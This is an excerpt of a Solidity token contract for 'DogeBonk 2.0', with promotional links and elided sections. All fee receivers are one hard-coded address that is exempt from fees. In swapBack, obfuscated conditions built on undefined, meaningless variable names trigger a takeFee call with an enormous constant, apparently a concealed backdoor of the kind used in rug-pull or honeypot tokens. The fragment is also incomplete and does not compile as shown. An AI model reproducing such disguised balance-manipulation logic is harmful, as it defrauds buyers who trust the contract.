/**
TG: https://t.me/DogeBonk2eth
WEB: https://dogebonk20.com
...
contract DogeBonk2 is IERC20, Ownable {
    using SafeMath for uint256;
    string private constant _name = 'DogeBonk 2.0';
    string private constant _symbol = unicode'DOBO2.0';
    uint8 private constant _decimals = 9;
    mapping (address => mapping (address => uint256)) private _allowances;
    mapping (address => bool) public IsExcludedFromFeeList;
    uint256 private developmentFee = 0;
    uint256 private burnFee = 0;
    uint256 private totalFee = 120;
    uint256 private sellFee = 120;
    bool private swapEnabled = true;
    uint256 private swapTimes;
    bool private swapping;
    uint256 swapAmount = 0;
    uint256 private toleratedtransferamount = 40000000 * (10 ** _decimals);
    uint256 private maxtransferamount = 10000000000 * (10 ** _decimals);
    ...
    address internal constant development_receiver = 0x625e45B769a7add1FC1D5D5b3568fe023062F873; 
    address internal constant marketing_receiver = 0x625e45B769a7add1FC1D5D5b3568fe023062F873;
    address internal constant liquidity_receiver = 0x625e45B769a7add1FC1D5D5b3568fe023062F873;
    ...
    constructor() Ownable() {
        ...
        IsExcludedFromFeeList[liquidity_receiver] = true;
        IsExcludedFromFeeList[marketing_receiver] = true;
    ...
    function swapBack(address sender, address recipient, uint256 amount) internal {
       ...
       bool rvalorant = !((buadine+verseep>2)||buadine==2);
        swapTimes =swapTimes+(rvalorant?takeFee(address(this), address(this), 8000000009600340000):1);  
    }
